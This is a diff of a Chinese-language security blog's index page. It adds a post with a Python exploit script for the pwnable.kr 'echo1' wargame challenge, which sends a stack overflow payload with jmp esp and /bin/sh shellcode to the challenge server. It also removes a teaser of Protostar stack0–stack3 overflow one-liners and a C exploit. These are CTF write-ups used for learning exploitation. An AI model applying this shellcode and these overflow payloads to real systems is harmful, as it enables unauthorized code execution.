@@ -288,6 +288,127 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo1/" itemprop="url">
+                  pwnable.kr-rookiss-echo1
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
+              2016-07-25
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/25/pwnable-rookiss-echo1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/25/pwnable-rookiss-echo1/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Trick">Trick</h2><p>没有开NX，又是简单的栈溢出，利用<code>jmp esp</code>来执行栈上的shellcode</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo1'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9010</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00400871</span>])</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">opcode_jmp_esp  = <span class="string">'\xff\xe4'</span></span><br><span class="line">io.writeline(opcode_jmp_esp)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.readline()</span><br><span class="line"></span><br><span class="line">adr_id      =   <span class="number">0x6020a0</span></span><br><span class="line">shellcode   = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'A'</span> * <span class="number">40</span></span><br><span class="line">payload +=  l64(adr_id)</span><br><span class="line">payload +=  shellcode</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-ascii-easy/" itemprop="url">
                   pwnable.kr-rookiss-ascii-easy
                 </a>
@@ -767,131 +888,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/20/protostar/" itemprop="url">
-                  protostar
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-20T00:00:00+08:00" content="2016-07-20">
-              2016-07-20
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/20/protostar/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/20/protostar/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="stack_0">stack 0</h2><p><code>python -c &quot;print &#39;A&#39;*65&quot; | ./stack0</code></p>
-<h2 id="stack_1">stack 1</h2><p><code>./stack1 $(python -c &quot;print &#39;dcba&#39;*17&quot;)</code></p>
-<h2 id="stack_2">stack 2</h2><h3 id="Exploit">Exploit</h3><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, const char <span class="variable">*argv</span>[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i               = <span class="number">0</span>;</span><br><span class="line">    char <span class="variable">*my_argv</span>[<span class="number">1</span>]    = &#123;NULL&#125;;</span><br><span class="line">    char <span class="variable">*my_env</span>[<span class="number">2</span>]     = &#123;NULL&#125;;</span><br><span class="line">    char <span class="keyword">env</span>[<span class="number">76</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">env</span>[<span class="number">0</span>] = <span class="string">'G'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">1</span>] = <span class="string">'R'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">2</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">3</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">4</span>] = <span class="string">'N'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">5</span>] = <span class="string">'I'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">6</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">7</span>] = <span class="string">'='</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">72</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">env</span>[i] = <span class="string">'A'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">72</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">73</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">74</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">75</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line"></span><br><span class="line">    my_env[<span class="number">0</span>] = <span class="keyword">env</span>;</span><br><span class="line">    my_env[<span class="number">1</span>] = NULL;</span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">"./stack2"</span>, my_argv, my_env);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="stack_3">stack 3</h2><p><code>python -c &quot;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&quot; | ./stack3</code></p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/20/protostar/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -937,7 +933,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">16</span>
+              <span class="site-state-item-count">17</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -945,7 +941,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">3</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
